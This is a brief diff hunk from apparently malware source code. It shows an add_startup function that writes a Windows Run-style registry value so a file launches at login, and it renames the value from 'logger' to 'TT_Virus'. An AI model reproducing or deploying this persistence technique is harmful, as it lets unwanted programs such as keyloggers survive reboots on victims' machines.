@@ -13,6 +13,6 @@ def add_startup():
 	key2change= OpenKey(HKEY_CURRENT_USER,
                             keyVal,0,KEY_ALL_ACCESS)
 
-	SetValueEx(key2change, "logger",0,REG_SZ, new_file_path)
+	SetValueEx(key2change, "TT_Virus",0,REG_SZ, new_file_path)
 
 add_startup()
